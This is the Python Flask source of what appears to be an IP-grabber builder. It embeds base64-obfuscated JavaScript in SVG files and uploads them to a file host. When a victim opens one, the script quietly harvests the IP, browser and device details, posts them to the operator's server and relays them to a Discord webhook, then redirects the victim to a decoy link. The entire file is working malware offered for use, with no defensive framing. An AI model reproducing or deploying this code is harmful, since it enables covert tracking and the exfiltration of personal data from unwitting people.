from flask import Flask, request, send_file
import requests
import json
from os import system
from urllib.request import urlopen
import io
import base64
import urllib.parse
import random
from dhooks import Webhook,Embed
apiurl = "YOURLINK"



app = Flask(__name__)

PAYLOAD_TEMPLATE = """<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <rect width="0" height="0" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
    <script type="text/javascript">
        %(js_code)s
    </script>
</svg>"""
def jsp_payloadd(id, apiurl,cdn):
    return '''
    function getCurrentInfo() {
  const userAgent = navigator.userAgent;
  const operatingSystem = navigator.platform;
  const browser = navigator.appName;
  const browserVersion = navigator.appVersion;
  const language = navigator.language;
  const currentTime = new Date();
  const screenSize = `${screen.width}x${screen.height}`;
  const devicePixelRatio = window.devicePixelRatio;
  const documentDimensions = `${document.documentElement.clientWidth}x${document.documentElement.clientHeight}`;
  const windowSize = `${window.innerWidth}x${window.innerHeight}`;
  let connectionType = null;
  if ('connection' in navigator) {
    connectionType = navigator.connection.effectiveType;
  }
  let batteryCharging = null;
  let batteryLevel = null;
  if ('getBattery' in navigator) {
    navigator.getBattery().then(battery => {
      batteryCharging = battery.charging;
      batteryLevel = battery.level;
    });
  }

  // Build query string
  const queryString = `?data=${btoa(
  `user_agent=${encodeURIComponent(userAgent)}` +
  `&amp;operating_system=${encodeURIComponent(operatingSystem)}` +
  `&amp;browser=${encodeURIComponent(browser)}` +
  `&amp;browser_version=${encodeURIComponent(browserVersion)}` +
  `&amp;language=${encodeURIComponent(language)}` +
  `&amp;current_time=${encodeURIComponent(currentTime.toString())}` +
  `&amp;screen_size=${encodeURIComponent(screenSize)}` +
  `&amp;device_pixel_ratio=${encodeURIComponent(devicePixelRatio)}` +
  `&amp;document_dimensions=${encodeURIComponent(documentDimensions)}` +
  `&amp;window_size=${encodeURIComponent(windowSize)}` +
  `&amp;connection_type=${encodeURIComponent(connectionType)}` +
  `&amp;battery_charging=${encodeURIComponent(batteryCharging)}` +
  `&amp;battery_level=${encodeURIComponent(batteryLevel)}&amp;id='''+str(id)+'''`,
)}`;


  // Send request to server
  fetch(`'''+apiurl+'''${queryString}`, {
    mode: 'no-cors',
    method: 'POST',
  })

}

getCurrentInfo();
window.location.href = "'''+cdn+'''"'''
def jsp_payload(id,apiurl,cdn):
  tempelate = jsp_payloadd(id,apiurl,cdn)
  message_bytes = tempelate.encode('ascii')
  base64_bytes = base64.b64encode(message_bytes)
  first_half = base64_bytes.decode('ascii')
  return """
  var decodedJS = atob(`"""+first_half+"""`);
  eval(decodedJS);
  setTimeout(() => { window.location.href = "https://anonfiles.com"}, 5000);
  """


@app.route("/",methods=['POST'])
def main():
  if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
    publicip = request.environ['REMOTE_ADDR']
  else:
    publicip = request.environ['HTTP_X_FORWARDED_FOR']
  r = requests.get(f"https://api.xdefcon.com/proxy/check/?ip={publicip}").text
  if 'proxy": true,' in r:
    proxy=True
  else:
    proxy=False
    
  base64en = request.args['data']
  #print(base64en)
  decoded_str = base64.b64decode(base64en).decode('utf-8')
  decoded_string = urllib.parse.unquote(decoded_str)
  decoded_stringg = decoded_string.split("&")
  embed = Embed(color=0xFF0000,
  timestamp='now' )
  
  embed.add_field(name="Ip", value=publicip.rstrip(),inline=False)
  embed.add_field(name="Proxy", value=proxy,inline=False)
  
  for item in decoded_stringg:
    
    if "id=" in item:
      id = item.split("id=")
      id = id[1]
      
      with open("users.txt","r") as f:
        for line in f:
          if id in line:
            line = line.split("|")
            hook = Webhook(line[1].rstrip())
            for line in decoded_stringg:
              line = line.split("=")
              decoded_stringg = line[0].replace("amp;","")
              embed.add_field(name=decoded_stringg.rstrip(), value=line[1].rstrip(),inline=False)
              #print(line+'\n')
            hook.send(embed=embed)
      
  
  
  #print(userAgent)
  return "worked", 200


  
@app.route('/build', methods=['POST'])
def build():
  cdn = request.form['cdn']
  fn = request.form['filename']
  webhook = request.form['webhook']
  id = random.randint(100000000, 999999999)
  f = open("users.txt","a")
  f.write(f"{id}|{webhook}\n")
  f.close()
  #filename = request.form['filename']
  
  def exploit(payload_name, js_payload):
    mem_f = io.BytesIO((PAYLOAD_TEMPLATE % {'js_code': js_payload}).encode())

    res = requests.post('https://api.anonfiles.com/upload', files={'file': (payload_name, mem_f)})

    if res.status_code == 200:
        json_data = res.json()
        return json_data['data']['file']['url']['full']

    return None




  payload = jsp_payload(id,apiurl,cdn)
  print(payload)
  dl_link = exploit(fn, payload)
  return f'{dl_link}'





@app.route('/alive/')
def alive():
  return 'alive'
app.run(debug=False,host='0.0.0.0', port=8000)
